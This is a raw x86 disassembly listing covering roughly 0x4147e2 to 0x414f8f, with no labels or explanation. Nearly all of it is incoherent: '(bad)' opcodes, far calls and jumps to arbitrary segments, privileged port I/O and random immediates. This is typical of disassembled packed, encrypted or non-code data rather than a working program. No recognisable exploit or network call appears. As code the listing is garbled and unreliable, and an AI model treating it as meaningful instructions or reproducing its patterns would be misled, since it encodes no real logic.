  4147e2:	add    BYTE PTR [ebp-0x47a631d7],0x91
  4147e9:	(bad)  
  4147ea:	push   ss
  4147eb:	into   
  4147ec:	xor    dh,BYTE PTR [ebx]
  4147ee:	lea    ecx,[eax-0x3c]
  4147f1:	jmp    0x5bdc7d9e
  4147f6:	jg     0x414804
  4147f8:	jmp    0x34be:0x415a42c1
  4147ff:	retf   0xcb54
  414802:	int3   
  414803:	or     edx,DWORD PTR [esi+0x79]
  414806:	jo     0x4147ac
  414808:	popa   
  414809:	aam    0xa7
  41480b:	les    ecx,FWORD PTR [eax]
  41480d:	sbb    BYTE PTR [ebx+0xd],bh
  414810:	shl    DWORD PTR [eax],0xe5
  414813:	inc    BYTE PTR ds:0x6b1d5593
  414819:	push   ecx
  41481a:	add    DWORD PTR [esi-0x318145ab],edi
  414820:	inc    eax
  414821:	pop    ebx
  414822:	pop    edx
  414823:	mov    esp,0xfa6269c9
  414828:	rcr    dl,cl
  41482a:	jno    0x414899
  41482c:	outs   dx,DWORD PTR ds:[esi]
  41482d:	sti    
  41482e:	scas   eax,DWORD PTR es:[edi]
  41482f:	and    bl,ch
  414831:	call   0x3bc76e00
  414836:	adc    DWORD PTR [edx+0x4a],ecx
  414839:	in     al,0xb8
  41483b:	inc    esi
  41483c:	mov    BYTE PTR [ebp+0x3c],cl
  41483f:	jns    0x4147e5
  414841:	dec    esp
  414842:	in     al,dx
  414843:	or     DWORD PTR [eax+eax*1],esi
  414846:	fcomp  DWORD PTR ds:0xefb56762
  41484c:	adc    eax,DWORD PTR es:[ebp-0x47]
  414850:	rcl    DWORD PTR [ecx-0x60e16f21],1
  414856:	(bad)  
  414857:	jle    0x414842
  414859:	cli    
  41485a:	or     BYTE PTR [ebp-0x43],bh
  41485d:	mov    ebx,0xa657b9cb
  414862:	std    
  414863:	mov    ebx,0x2a26ba1a
  414868:	leave  
  414869:	shl    BYTE PTR ds:0xf4942bed,cl
  41486f:	and    DWORD PTR [edi],esp
  414871:	xchg   ebp,eax
  414872:	jecxz  0x414819
  414874:	daa    
  414875:	xor    DWORD PTR [edx-0x43],ecx
  414878:	inc    ebx
  414879:	mov    ebx,0xaa1d3a10
  41487e:	int3   
  41487f:	mov    ecx,0x790ac8e3
  414884:	mov    BYTE PTR [esp+eax*8+0x476b2eef],cl
  41488b:	dec    eax
  41488c:	ror    al,1
  41488e:	push   ds
  41488f:	rcr    DWORD PTR [ecx],1
  414891:	jl     0x4148c5
  414893:	pop    esp
  414894:	pushf  
  414895:	xchg   esi,eax
  414896:	and    al,0x13
  414898:	fisubr WORD PTR [eax]
  41489a:	sbb    DWORD PTR [eax+0x3eb6d78f],ebp
  4148a0:	sbb    eax,0x2cdf1e95
  4148a5:	aad    0x92
  4148a7:	repz fdivr DWORD PTR ds:[edi+0x41]
  4148ac:	jmp    0x74c26b85
  4148b1:	out    0xc2,eax
  4148b3:	out    0xb,al
  4148b5:	lock clc 
  4148b7:	push   ebx
  4148b8:	(bad)  
  4148ba:	clc    
  4148bb:	dec    esp
  4148bc:	dec    ecx
  4148bd:	outs   dx,BYTE PTR ds:[esi]
  4148be:	je     0x4148c9
  4148c0:	jae    0x414894
  4148c2:	fst    DWORD PTR [ebp+0x9]
  4148c5:	arpl   WORD PTR [ebx-0x5f49bf44],di
  4148cb:	dec    esp
  4148cc:	daa    
  4148cd:	mov    esp,0x5adc1964
  4148d2:	cmp    al,0x1d
  4148d4:	retf   
  4148d5:	ds test bh,ch
  4148d8:	loopne 0x414869
  4148da:	mov    eax,0x97155208
  4148df:	mov    ecx,0xdc28c2de
  4148e4:	pop    eax
  4148e5:	xchg   ecx,eax
  4148e6:	pop    eax
  4148e7:	sub    bh,bh
  4148e9:	ins    BYTE PTR es:[edi],dx
  4148ea:	fs (bad) 
  4148ec:	unpcklps xmm0,XMMWORD PTR [ecx-0x333d6e2a]
  4148f3:	jecxz  0x41495b
  4148f5:	das    
  4148f6:	cwde   
  4148f7:	mov    ds:0x8416c2bb,al
  4148fc:	mov    cl,0x8b
  4148fe:	pop    edx
  4148ff:	es sub esi,edi
  414902:	mov    al,ds:0xfe4b9db7
  414907:	inc    edi
  414908:	jns    0x414980
  41490a:	daa    
  41490b:	cwde   
  41490c:	into   
  41490d:	adc    DWORD PTR [ecx],0x12e236b
  414913:	test   eax,0xf611c3c7
  414918:	shl    BYTE PTR [edx-0x53f218ab],cl
  41491e:	add    DWORD PTR [ecx],esi
  414920:	(bad)  
  414921:	out    dx,al
  414922:	(bad)  
  414924:	icebp  
  414925:	pop    ebp
  414926:	aas    
  414927:	cmp    dh,BYTE PTR [ebx]
  414929:	repz cs gs loope 0x4148d9
  41492e:	test   BYTE PTR [bx+di+0x4c],bh
  414932:	pop    es
  414933:	idiv   BYTE PTR [esi-0x2c8a5eee]
  414939:	and    DWORD PTR [esi],ecx
  41493b:	push   es
  41493c:	scas   eax,DWORD PTR es:[edi]
  41493d:	imul   ebx,DWORD PTR [edx+ebp*1-0x1c64c13d],0xffffff94
  414945:	xor    al,BYTE PTR ds:0x6da17d9f
  41494b:	and    cl,BYTE PTR [ebx+0x27c1020f]
  414951:	les    ebx,FWORD PTR [edx]
  414953:	lahf   
  414954:	push   ds
  414955:	push   es
  414956:	inc    edi
  414957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414958:	xchg   esp,eax
  414959:	push   esi
  41495a:	cdq    
  41495b:	into   
  41495c:	scas   al,BYTE PTR es:[edi]
  41495d:	pmaxub mm7,QWORD PTR [edx+esi*8+0x4e0a8bf1]
  414965:	sbb    BYTE PTR [esi-0x2b],ch
  414968:	test   al,0x58
  41496a:	sti    
  41496b:	sub    BYTE PTR ds:0x6e96cf88,ah
  414971:	bound  edx,QWORD PTR [ebp+0x4f]
  414974:	je     0x4149cc
  414976:	js     0x41499a
  414978:	sub    al,0x97
  41497a:	sbb    dl,BYTE PTR [edx-0x21]
  41497d:	mov    edx,0x5009ade2
  414982:	fst    QWORD PTR [esi]
  414984:	not    DWORD PTR [esi]
  414986:	inc    esp
  414987:	and    al,0x13
  414989:	pop    ds
  41498a:	dec    eax
  41498b:	int    0xa3
  41498d:	push   es
  41498e:	retf   
  41498f:	mov    ds:0x5739649b,al
  414994:	push   cs
  414995:	(bad)  
  414996:	repz fnsave [ebp-0x78]
  41499a:	repz and edi,ebx
  41499d:	jmp    0xb95b29fa
  4149a2:	rol    DWORD PTR gs:[edx+0x4ec084d],0x67
  4149aa:	mov    ecx,0x128f711f
  4149af:	inc    edi
  4149b0:	pop    ecx
  4149b1:	pushf  
  4149b2:	ss cwde 
  4149b4:	mov    esi,0xf2a198e2
  4149b9:	das    
  4149ba:	xchg   edx,eax
  4149bb:	lods   al,BYTE PTR ds:[esi]
  4149bc:	adc    al,0xcf
  4149be:	mov    bl,0xf1
  4149c0:	call   FWORD PTR [eax]
  4149c2:	inc    eax
  4149c3:	mov    bh,0xad
  4149c5:	aad    0xee
  4149c7:	inc    eax
  4149c8:	mov    al,0x8e
  4149ca:	push   edx
  4149cb:	pop    ebp
  4149cc:	adc    ah,dl
  4149ce:	outs   dx,DWORD PTR ds:[esi]
  4149cf:	xchg   ebx,eax
  4149d0:	cmp    eax,0x91dd6422
  4149d5:	test   al,ah
  4149d7:	sub    ebx,DWORD PTR [eax-0x322196bb]
  4149dd:	ret    0x96d9
  4149e0:	pushf  
  4149e1:	and    edx,DWORD PTR [esi-0x2747e1f8]
  4149e7:	push   edx
  4149e8:	dec    ebp
  4149e9:	call   0x3da6bb9b
  4149ee:	mov    bl,0x9e
  4149f0:	sub    DWORD PTR [eax-0xc],ecx
  4149f3:	push   ebx
  4149f4:	(bad)  
  4149f5:	push   esi
  4149f6:	clc    
  4149f7:	out    dx,al
  4149f8:	rcl    DWORD PTR [edi],cl
  4149fa:	mov    gs,WORD PTR [edx]
  4149fc:	jmp    0x131c:0x797e9283
  414a03:	sti    
  414a04:	adc    DWORD PTR [ecx-0x56],ebx
  414a07:	push   ebp
  414a08:	icebp  
  414a09:	retf   
  414a0a:	imul   ecx,DWORD PTR [edi-0x77],0xffffffb0
  414a0e:	(bad)  
  414a0f:	shl    BYTE PTR [edx-0x614412b],cl
  414a15:	xchg   BYTE PTR [ebp+0x3681c829],dh
  414a1b:	aaa    
  414a1c:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  414a1e:	cmp    BYTE PTR [esi+0x147464a1],dh
  414a24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a25:	daa    
  414a26:	sbb    BYTE PTR [edx+0x2c],ah
  414a29:	lods   al,BYTE PTR ds:[esi]
  414a2a:	fbstp  TBYTE PTR [ebx+0x67]
  414a2d:	jmp    0x8287c2eb
  414a32:	add    al,0xe1
  414a34:	gs adc eax,0xe4367914
  414a3a:	and    bl,dh
  414a3c:	ja     0x414a38
  414a3e:	pop    esp
  414a3f:	or     eax,0x85dc489c
  414a44:	aaa    
  414a45:	xchg   edx,ebx
  414a47:	in     al,dx
  414a48:	xchg   esp,eax
  414a49:	test   BYTE PTR [ebx+0x409e2589],dl
  414a4f:	adc    DWORD PTR [esi],ebx
  414a51:	cmp    BYTE PTR ds:0xe677d156,ah
  414a57:	fcom   DWORD PTR [ebx+0x53b790be]
  414a5d:	mov    WORD PTR [edx],?
  414a5f:	out    0x73,eax
  414a61:	cmc    
  414a62:	sub    BYTE PTR [eax+0x74],dl
  414a65:	retf   0xf76b
  414a68:	push   es
  414a69:	enter  0x6818,0x1a
  414a6d:	aad    0x29
  414a6f:	xchg   esi,eax
  414a70:	xchg   ebx,eax
  414a71:	lahf   
  414a72:	and    dh,BYTE PTR [ecx+0x3d]
  414a75:	(bad)  
  414a76:	das    
  414a77:	mov    ds:0xc469681c,al
  414a7c:	mov    al,ds:0x3a4774ea
  414a81:	gs (bad) 
  414a83:	push   cs
  414a84:	lock out dx,eax
  414a86:	mov    ah,0x44
  414a88:	or     BYTE PTR [ebp+0x2bff9c79],bh
  414a8e:	retf   
  414a8f:	pusha  
  414a90:	call   0x5e34:0x73aa87ef
  414a97:	and    DWORD PTR gs:[edi+0x24],edx
  414a9b:	out    dx,eax
  414a9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a9d:	pop    esp
  414a9e:	out    0x5c,eax
  414aa0:	mov    ebp,0x64ac5e2e
  414aa5:	js     0x414a64
  414aa7:	mov    al,ds:0x93765d36
  414aac:	xchg   BYTE PTR [edi-0x7f24d3aa],dl
  414ab2:	inc    edi
  414ab3:	idiv   cl
  414ab5:	test   BYTE PTR [esi-0x24],al
  414ab8:	adc    al,0xa9
  414aba:	mov    DWORD PTR [eax+0x2a74f3a4],eax
  414ac0:	mov    al,0x99
  414ac2:	sbb    edx,DWORD PTR [esi]
  414ac4:	or     ch,BYTE PTR [ebp-0x3a76fdde]
  414aca:	cmp    esi,eax
  414acc:	mov    bl,0x60
  414ace:	xor    eax,0xa76f2279
  414ad3:	outs   dx,BYTE PTR ds:[esi]
  414ad4:	jnp    0x414b37
  414ad6:	scas   eax,DWORD PTR es:[edi]
  414ad7:	and    edi,edx
  414ad9:	out    dx,al
  414ada:	mov    al,0x71
  414adc:	sub    al,0x95
  414ade:	fmul   QWORD PTR [edi]
  414ae0:	jl     0x414a78
  414ae2:	rcl    DWORD PTR [esp+ebp*1+0x27],1
  414ae6:	jb     0x414b02
  414ae8:	icebp  
  414ae9:	cwde   
  414aea:	and    al,0x3a
  414aec:	shl    DWORD PTR [eax+0x75],0x52
  414af0:	js     0x414a8e
  414af2:	pop    ebp
  414af3:	lods   al,BYTE PTR ds:[esi]
  414af4:	sti    
  414af5:	dec    ecx
  414af6:	push   esi
  414af7:	ficomp DWORD PTR [eax]
  414af9:	cmc    
  414afa:	pop    eax
  414afb:	cwde   
  414afc:	and    eax,0x2bca50cf
  414b01:	test   BYTE PTR [ebp+0x347b86a4],ah
  414b07:	(bad)  
  414b08:	(bad)  
  414b09:	pop    ecx
  414b0a:	mov    al,0x15
  414b0c:	cmp    ah,BYTE PTR [edx+0x47]
  414b0f:	xor    dl,BYTE PTR [eax+0x747a4a79]
  414b15:	pop    ebx
  414b16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b17:	jb     0x414b6e
  414b19:	popf   
  414b1a:	dec    edi
  414b1b:	mov    ch,0x5
  414b1d:	inc    edx
  414b1e:	fwait
  414b1f:	add    eax,0x156573c0
  414b24:	adc    dh,dl
  414b26:	nop
  414b27:	sub    DWORD PTR [ebx],esi
  414b29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b2a:	mov    ch,0x32
  414b2c:	push   0xefa8e6ac
  414b31:	cmp    BYTE PTR [edx],cl
  414b33:	pusha  
  414b34:	iret   
  414b35:	imul   edi,DWORD PTR [eax+0x7d],0x7d9b1b49
  414b3c:	add    DWORD PTR [ecx+0x4e823949],esi
  414b42:	cmp    eax,0x756f388f
  414b47:	das    
  414b48:	mov    ds:0x66c90b83,eax
  414b4d:	add    al,0xfb
  414b4f:	and    bh,BYTE PTR [ebx]
  414b51:	je     0x414b81
  414b53:	mov    bh,0x9e
  414b55:	push   es
  414b56:	test   ebp,0x388cc4fa
  414b5c:	jae    0x414ba1
  414b5e:	inc    esi
  414b5f:	fstp   DWORD PTR [ebp-0x63]
  414b62:	push   esp
  414b63:	push   ss
  414b64:	xchg   DWORD PTR [edx+0xa],edx
  414b67:	sub    al,0x2b
  414b69:	call   0xb76e:0xa6d5205e
  414b70:	mov    cl,0xc3
  414b72:	shrd   ecx,esi,0x5c
  414b76:	sahf   
  414b77:	cwde   
  414b78:	pushf  
  414b79:	jne    0x414b65
  414b7b:	jno    0x414b18
  414b7d:	xchg   ebp,eax
  414b7e:	sub    eax,DWORD PTR [edi-0x1]
  414b81:	inc    ebx
  414b82:	sub    DWORD PTR [ecx+0x98ee2dc],0x6d
  414b89:	fmul   st(0),st
  414b8b:	inc    ebx
  414b8c:	adc    edx,edi
  414b8e:	dec    ebp
  414b8f:	push   ebx
  414b90:	adc    eax,0x6a1e17e1
  414b95:	and    eax,0x857745f
  414b9a:	out    dx,al
  414b9b:	cmp    eax,esp
  414b9d:	xchg   ecx,eax
  414b9e:	in     eax,0xdb
  414ba0:	push   es
  414ba1:	adc    eax,DWORD PTR [ebx]
  414ba3:	ror    ch,cl
  414ba5:	mov    bh,0xde
  414ba7:	cwde   
  414ba8:	dec    edx
  414ba9:	mov    eax,ds:0x315be174
  414bae:	in     al,dx
  414baf:	in     eax,0xee
  414bb1:	dec    esp
  414bb2:	ds scas al,BYTE PTR es:[edi]
  414bb4:	push   edx
  414bb5:	test   eax,0x6d40ea2
  414bba:	test   DWORD PTR [esi+0x771d4056],ebx
  414bc0:	cmp    eax,0x3197b0f2
  414bc5:	outs   dx,DWORD PTR ds:[esi]
  414bc6:	and    DWORD PTR [ebp+0x735be022],esi
  414bcc:	gs rol ch,cl
  414bcf:	push   eax
  414bd0:	retw   0x5c4d
  414bd4:	or     eax,0xf8ed992b
  414bd9:	stc    
  414bda:	sub    al,0xab
  414bdc:	shl    BYTE PTR ds:0x452be7d,0x96
  414be3:	outs   dx,DWORD PTR ds:[esi]
  414be4:	call   0x13d6:0x5a9913c5
  414beb:	retf   
  414bec:	aam    0x4
  414bee:	retf   
  414bef:	das    
  414bf0:	fxch   st(6)
  414bf2:	push   ss
  414bf3:	popa   
  414bf4:	jns    0x414bf3
  414bf6:	lds    edi,FWORD PTR [ecx-0x6d]
  414bf9:	je     0x414bd1
  414bfb:	fsubr  QWORD PTR [edi+0x63]
  414bfe:	nop
  414bff:	stc    
  414c00:	add    BYTE PTR [edx-0x4e0ac78e],0xff
  414c07:	xchg   ecx,eax
  414c08:	fiadd  DWORD PTR [ebx+0x3ead0335]
  414c0e:	fwait
  414c0f:	test   al,0x28
  414c11:	dec    di
  414c13:	jbe    0x414bc0
  414c15:	mov    ecx,0x2bb56607
  414c1a:	xor    dl,BYTE PTR [edx]
  414c1c:	xchg   esp,eax
  414c1d:	jge    0x414c89
  414c1f:	push   edi
  414c20:	and    bh,bh
  414c22:	xor    ebp,eax
  414c24:	xlat   BYTE PTR ds:[ebx]
  414c25:	xchg   edi,eax
  414c26:	push   ecx
  414c27:	scas   eax,DWORD PTR es:[edi]
  414c28:	push   ebp
  414c29:	pop    esp
  414c2a:	cmp    ebp,DWORD PTR [eax-0x19d921c8]
  414c30:	addr16 gs loope 0x414c94
  414c34:	fwait
  414c35:	xor    DWORD PTR [ecx-0x7269f197],0xe28db86c
  414c3f:	mov    WORD PTR [edi],fs
  414c41:	jno    0x414cb4
  414c43:	int3   
  414c44:	pop    ss
  414c45:	mov    edx,0x82151a55
  414c4a:	movzx  ebp,BYTE PTR [esi-0x77]
  414c4e:	out    dx,eax
  414c4f:	add    DWORD PTR [ecx+0x22],edi
  414c52:	or     DWORD PTR [eax-0x60845184],0x52
  414c59:	jo     0x414c23
  414c5b:	xchg   ebx,eax
  414c5c:	pop    es
  414c5d:	or     BYTE PTR [ecx-0x2236eb57],dl
  414c63:	sbb    DWORD PTR [ebx],esp
  414c65:	sahf   
  414c66:	mov    dl,0x0
  414c68:	je     0x414c28
  414c6a:	pushf  
  414c6b:	jno    0x414ca2
  414c6d:	mov    bl,0x71
  414c6f:	xlat   BYTE PTR ds:[ebx]
  414c70:	mov    al,0x6d
  414c72:	push   eax
  414c73:	dec    esp
  414c74:	ins    BYTE PTR es:[edi],dx
  414c75:	adc    esp,DWORD PTR [edi+0x75c50154]
  414c7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c7c:	hlt    
  414c7d:	push   cs
  414c7e:	repz clc 
  414c80:	nop
  414c81:	call   0xcb038bef
  414c86:	mov    ds:0xbcbbef11,al
  414c8b:	loop   0x414c87
  414c8d:	call   0x2a36a653
  414c92:	xor    cl,BYTE PTR [edx-0x12]
  414c95:	cmp    DWORD PTR [eax],ebx
  414c97:	stos   BYTE PTR es:[edi],al
  414c98:	mov    eax,ds:0xad2d870c
  414c9d:	call   0xb8b23e48
  414ca2:	jno    0x414cab
  414ca4:	xchg   edx,eax
  414ca5:	xchg   edi,eax
  414ca6:	(bad)  fs:[ecx-0x38650817]
  414cad:	addr16 push ecx
  414caf:	out    dx,eax
  414cb0:	inc    ebx
  414cb1:	repz adc ah,BYTE PTR [ecx+0x40]
  414cb5:	pop    edx
  414cb6:	icebp  
  414cb7:	xchg   edx,eax
  414cb8:	loopne 0x414d31
  414cba:	test   esp,ebx
  414cbc:	es jo  0x414c63
  414cbf:	popa   
  414cc0:	and    al,0xd3
  414cc2:	ds retf 0x353f
  414cc6:	sti    
  414cc7:	jp     0x414c7d
  414cc9:	call   0x9f11fc01
  414cce:	ret    
  414ccf:	hlt    
  414cd0:	out    dx,eax
  414cd1:	xchg   BYTE PTR [ebx],cl
  414cd3:	xchg   DWORD PTR [ebp-0x80],ebx
  414cd6:	retf   
  414cd7:	jle    0x414c7f
  414cd9:	in     al,dx
  414cda:	mov    bl,0x9
  414cdc:	dec    ch
  414cde:	dec    edx
  414cdf:	mov    esp,0x98cdf868
  414ce4:	jge    0x414ccf
  414ce6:	lea    eax,[esi+0x10]
  414ce9:	dec    ecx
  414cea:	(bad)  
  414ceb:	icebp  
  414cec:	cmp    eax,ebp
  414cee:	push   ebp
  414cef:	mov    esp,0x7d054509
  414cf4:	fnstsw WORD PTR [ecx]
  414cf6:	inc    ebx
  414cf7:	add    eax,0xc0799429
  414cfc:	mov    esi,ebp
  414cfe:	sbb    DWORD PTR [ebx+0x36],0xffffffbe
  414d02:	inc    ebp
  414d03:	inc    edx
  414d04:	in     eax,dx
  414d05:	xchg   DWORD PTR [edi],ebx
  414d07:	xor    al,0xca
  414d09:	mov    ecx,0x72b03c14
  414d0e:	es stos DWORD PTR es:[edi],eax
  414d10:	sub    eax,0xb68b5933
  414d15:	jnp    0x414cdf
  414d17:	fld    QWORD PTR [edx+0x3110035d]
  414d1d:	imul   ecx,DWORD PTR [ecx+edx*8+0x79c49446],0x8128118c
  414d28:	out    0x90,al
  414d2a:	inc    ebp
  414d2b:	dec    edx
  414d2c:	mov    eax,0x96f2bf09
  414d31:	sub    bh,BYTE PTR [esi-0x4ececfc7]
  414d37:	xchg   ebx,eax
  414d38:	pop    esi
  414d39:	pop    esp
  414d3a:	sbb    dl,ch
  414d3c:	xchg   ecx,eax
  414d3d:	in     eax,dx
  414d3e:	xchg   BYTE PTR [edi],al
  414d40:	push   esp
  414d41:	shl    BYTE PTR [ebp+0x6c],1
  414d44:	int3   
  414d45:	pop    ds
  414d46:	sub    DWORD PTR [esi+0x7cff4d19],ecx
  414d4c:	xchg   esi,eax
  414d4d:	cmp    al,BYTE PTR [esi-0x7]
  414d50:	mov    BYTE PTR [edi],ah
  414d52:	lahf   
  414d53:	add    dl,bh
  414d55:	sub    DWORD PTR [edi],eax
  414d57:	adc    esi,ebp
  414d59:	lock xchg esi,eax
  414d5b:	push   esi
  414d5c:	pop    ecx
  414d5d:	aad    0x97
  414d5f:	mov    edx,0x96b55380
  414d64:	inc    al
  414d66:	popa   
  414d67:	and    bh,BYTE PTR [esi-0x3f07aaf6]
  414d6d:	sti    
  414d6e:	jmp    0xc7fc9cb6
  414d73:	inc    eax
  414d74:	pop    ebp
  414d75:	adc    BYTE PTR [edi-0x4dba5764],dh
  414d7b:	retf   
  414d7c:	xchg   ebx,eax
  414d7d:	scas   al,BYTE PTR es:[edi]
  414d7e:	rcl    BYTE PTR [esi],cl
  414d80:	in     eax,dx
  414d81:	dec    edi
  414d82:	iret   
  414d83:	nop
  414d84:	outs   dx,DWORD PTR ds:[esi]
  414d85:	mov    esp,0xcadd7b50
  414d8a:	ret    
  414d8b:	adc    ah,BYTE PTR [edx+ebp*4]
  414d8e:	xchg   ecx,eax
  414d8f:	dec    esi
  414d90:	cmp    al,0x6a
  414d92:	inc    ebx
  414d93:	mov    esp,DWORD PTR [edx+0x6a0e06a2]
  414d99:	push   ebx
  414d9a:	mov    ah,0x55
  414d9c:	sub    al,0x3
  414d9e:	add    DWORD PTR cs:[edx+0x320b7a7c],ebp
  414da5:	or     eax,DWORD PTR [eax]
  414da7:	inc    BYTE PTR [eax]
  414da9:	inc    esi
  414daa:	aas    
  414dab:	aam    0x2d
  414dad:	jl     0x414dd8
  414daf:	pop    ecx
  414db0:	test   eax,0x6611bce9
  414db5:	shl    BYTE PTR cs:[esi-0x62856feb],0x3e
  414dbd:	adc    DWORD PTR [edx],ebp
  414dbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dc0:	inc    ebx
  414dc1:	jmp    0x414e10
  414dc3:	mov    esi,0x59b3a175
  414dc8:	sar    DWORD PTR [esi-0x16c80c46],1
  414dce:	xchg   ecx,eax
  414dcf:	pushf  
  414dd0:	dec    ecx
  414dd1:	ss or  dh,ah
  414dd4:	adc    ecx,DWORD PTR [ebx]
  414dd6:	(bad)  
  414dd7:	fucomi st,st(0)
  414dd9:	sti    
  414dda:	xchg   edi,eax
  414ddb:	mov    esp,0x63e6bbe3
  414de0:	xchg   BYTE PTR [ecx+0x4fbd1d08],al
  414de6:	rcl    DWORD PTR [edx],cl
  414de8:	cdq    
  414de9:	jg     0x414e1e
  414deb:	xlat   BYTE PTR ds:[ebx]
  414dec:	jae    0x414dc3
  414dee:	push   ebp
  414def:	xchg   BYTE PTR [edx],ch
  414df1:	clc    
  414df2:	xchg   esp,eax
  414df4:	sbb    bh,BYTE PTR [ebx+0x50]
  414df7:	jb     0x414e26
  414df9:	sti    
  414dfa:	jae    0x414dd1
  414dfc:	or     eax,0x804b32f9
  414e01:	movq   mm3,QWORD PTR [ebx+esi*8+0x556cb0c2]
  414e09:	push   ebx
  414e0a:	fbld   TBYTE PTR [ebx+eax*8+0x6a]
  414e0e:	jp     0x414dc1
  414e10:	sbb    BYTE PTR [esi-0x6a7f1ef5],ah
  414e16:	or     DWORD PTR [ecx],edx
  414e18:	lahf   
  414e19:	shl    DWORD PTR [ebx+0x223ae2b7],1
  414e1f:	mov    ds:0xbf63f75d,eax
  414e24:	and    al,0x9
  414e26:	mov    ah,0x91
  414e28:	xor    al,0x5a
  414e2a:	cs (bad) 
  414e2c:	fsubr  DWORD PTR [ecx]
  414e2e:	call   0xa415:0x2e98a846
  414e35:	xchg   BYTE PTR [ebx],cl
  414e37:	aaa    
  414e38:	or     BYTE PTR [ebx+0x9c38d5e],ah
  414e3e:	xchg   edx,eax
  414e3f:	loop   0x414e12
  414e41:	mov    ebx,0x19fbf1c0
  414e46:	mov    ah,0x6c
  414e48:	xchg   BYTE PTR [ebx-0xcb3b8c5],bh
  414e4e:	test   DWORD PTR [ebx-0x36dfd298],eax
  414e54:	push   ds
  414e55:	mov    ecx,0xf2d47f45
  414e5a:	mov    ecx,0x589bd1e5
  414e5f:	or     BYTE PTR [esi+0xb2f990c],ah
  414e65:	je     0x414ea4
  414e67:	fsub   QWORD PTR [esi+eiz*4]
  414e6a:	add    al,0x79
  414e6c:	xor    ch,BYTE PTR ds:0x241f853
  414e72:	(bad)  
  414e73:	leave  
  414e74:	push   0x7e86fee2
  414e79:	mov    ecx,0xe16360fa
  414e7e:	sar    BYTE PTR [ecx+0x2f20a98],cl
  414e84:	mov    ebx,0xdcedeb8f
  414e89:	or     eax,0xc82f7e71
  414e8f:	pop    esi
  414e90:	daa    
  414e91:	cmc    
  414e92:	lea    eax,[esi-0x6080ff93]
  414e98:	pop    es
  414e99:	shl    ch,1
  414e9b:	xchg   ebp,eax
  414e9c:	push   eax
  414e9d:	pop    ecx
  414e9e:	das    
  414e9f:	stc    
  414ea0:	mov    dh,0xb
  414ea2:	dec    DWORD PTR [edi+ebx*2+0x5f]
  414ea6:	into   
  414ea7:	cmp    bh,bh
  414ea9:	loope  0x414eb0
  414eab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414eac:	mov    ecx,0x3a36e5ee
  414eb1:	(bad)  
  414eb2:	jg     0x414efb
  414eb4:	(bad)  
  414eb5:	cmp    al,ch
  414eb7:	sbb    eax,0x9efcc6e7
  414ebc:	out    0xbd,al
  414ebe:	sbb    ch,ch
  414ec0:	fcom   DWORD PTR [ebx+0x79]
  414ec3:	dec    edi
  414ec4:	mov    eax,ds:0xfe248ae
  414ec9:	push   edi
  414eca:	and    BYTE PTR [edx-0x5e67a4c2],bl
  414ed0:	dec    edi
  414ed1:	xchg   DWORD PTR [edi+edi*1],ebx
  414ed4:	add    DWORD PTR [esi],ebp
  414ed6:	fwait
  414ed7:	out    dx,eax
  414ed8:	or     al,0x69
  414eda:	stos   DWORD PTR es:[edi],eax
  414edb:	sbb    dl,BYTE PTR [ecx]
  414edd:	sub    dh,ah
  414edf:	xchg   ecx,eax
  414ee0:	les    edx,FWORD PTR [edi+0x4acb60d5]
  414ee6:	std    
  414ee7:	add    edi,ebx
  414ee9:	mov    edx,0xdb90a0e6
  414eee:	xlat   BYTE PTR ds:[ebx]
  414eef:	outs   dx,BYTE PTR ds:[esi]
  414ef0:	(bad)  
  414ef1:	ror    al,1
  414ef3:	add    BYTE PTR [esi+0x68],ch
  414ef6:	sti    
  414ef7:	loope  0x414f3e
  414ef9:	ins    BYTE PTR es:[edi],dx
  414efa:	sbb    al,0xba
  414efc:	jmp    DWORD PTR [edi+0x35]
  414eff:	sub    DWORD PTR [ebx+ecx*1+0x77],ebp
  414f03:	jbe    0x414f05
  414f05:	ins    DWORD PTR es:[edi],dx
  414f06:	ja     0x414f52
  414f08:	push   esi
  414f09:	adc    eax,0x524a9f7
  414f0e:	(bad)
  414f11:	jnp    0x414f69
  414f13:	and    BYTE PTR [eax+ebp*1],al
  414f16:	loopne 0x414f51
  414f18:	inc    esp
  414f19:	cmp    al,0x59
  414f1b:	test   al,0x3d
  414f1d:	cmp    ecx,DWORD PTR [edx+0x4e]
  414f20:	pushf  
  414f21:	add    ebp,DWORD PTR [ebx-0x37]
  414f24:	cdq    
  414f25:	mov    edx,0x60c2703b
  414f2a:	xchg   esp,eax
  414f2b:	xor    eax,DWORD PTR [edx]
  414f2d:	adc    BYTE PTR [edi-0x3],bl
  414f30:	dec    ecx
  414f31:	or     BYTE PTR [ebx],0x3a
  414f34:	cwde   
  414f35:	or     BYTE PTR ds:0xaef2005d,cl
  414f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f3c:	cmp    eax,0xa6b4fe2b
  414f41:	ss ins DWORD PTR es:[edi],dx
  414f43:	push   esi
  414f44:	cld    
  414f45:	mov    WORD PTR [esi+0x65],gs
  414f48:	das    
  414f49:	ret    0x49a7
  414f4c:	ds fsubp st(2),st
  414f4f:	ss pop edi
  414f51:	das    
  414f52:	sub    edx,edx
  414f54:	pop    esi
  414f55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f56:	fbld   TBYTE PTR [ebx+ecx*8]
  414f59:	iret   
  414f5a:	add    cl,BYTE PTR [eax+0x6bbf20c5]
  414f60:	sub    ah,cl
  414f62:	ins    BYTE PTR es:[edi],dx
  414f63:	sbb    DWORD PTR [ebp+0x6d],ebx
  414f66:	cmp    al,0xbb
  414f68:	sbb    ecx,ecx
  414f6a:	(bad)  
  414f6b:	sbb    eax,0x86b04e86
  414f70:	sar    DWORD PTR [ecx+0x1d769224],1
  414f76:	sub    BYTE PTR [ebp-0x42],dl
  414f79:	cli    
  414f7a:	add    ecx,DWORD PTR [esp+eax*2-0x58]
  414f7e:	mov    al,ds:0x32907821
  414f83:	cwde   
  414f84:	inc    edx
  414f85:	xchg   edi,eax
  414f86:	or     eax,0xfbaf9c1e
  414f8b:	lea    ebp,[eax]
  414f8d:	jp     0x414ff0
  414f8f:	sbb    BYTE PTR [edx],ch
